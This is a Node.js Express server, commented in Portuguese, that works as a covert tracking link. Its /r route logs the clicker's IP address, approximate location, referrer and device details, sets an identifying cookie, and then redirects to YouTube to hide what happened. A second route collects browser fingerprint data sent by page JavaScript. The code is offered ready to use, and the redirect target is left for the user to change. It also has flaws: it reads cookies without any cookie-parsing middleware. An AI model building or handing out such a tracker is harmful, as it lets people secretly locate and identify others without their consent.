const express = require('express');
const geoip    = require('geoip-lite');
const { UserAgent } = require('user-agents');      // opcional, mas melhora parse
const uaParser = require('ua-parser-js');

const app = express();
app.use(express.json());                           // para receber POST do frontend
app.use(express.static('public'));                 // pasta com o HTML/JS que vamos criar

// ---------- raiz = página onde faremos fingerprint
app.get('/', (_req, res) =>
  res.sendFile(__dirname + '/public/index.html'));

// ---------- rota de rastreio (primeiro clique)
app.get('/r', (req, res) => {
  const ip = (req.headers['x-forwarded-for']||'').split(',')[0]
          || req.socket.remoteAddress;
  const uaString = req.headers['user-agent'];
  const ref = req.headers.referer || 'direto';
  const geo = geoip.lookup(ip);

  const ua = uaParser(uaString);
  const deviceId = Math.random().toString(36).slice(2); // ID simples pro resto da sessão

  // guarda tudo (aqui só console; pode jogar num BD)
  const obj = {
    deviceId,
    ip,
    geo,
    ref,
    hora: new Date().toISOString(),
    navegador: `${ua.browser.name} ${ua.browser.major}`,
    so: `${ua.os.name} ${ua.os.version}`,
    vendor: ua.device.vendor,
    model: ua.device.model,
    tipo: ua.device.type,
    userAgent: uaString
  };
  console.table(obj);

  // cria cookie para cruzar com o POST que virá da página
  res.cookie('did', deviceId, {maxAge: 900000, httpOnly: true});
  // redireciona para a página normal (pode ser vídeo, imagem, etc.)
  res.redirect('https://youtube.com');   // <= mude para onde quiser
});

// ---------- recebe dados extras coletados via JS
app.post('/f', (req,res)=>{
  const did = req.cookies.did;
  if(!did) return res.sendStatus(204);
  console.log('Fingerprint:', {deviceId: did, ...req.body});
  res.sendStatus(204);
});

// ---------- start
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`ON ${PORT}`));
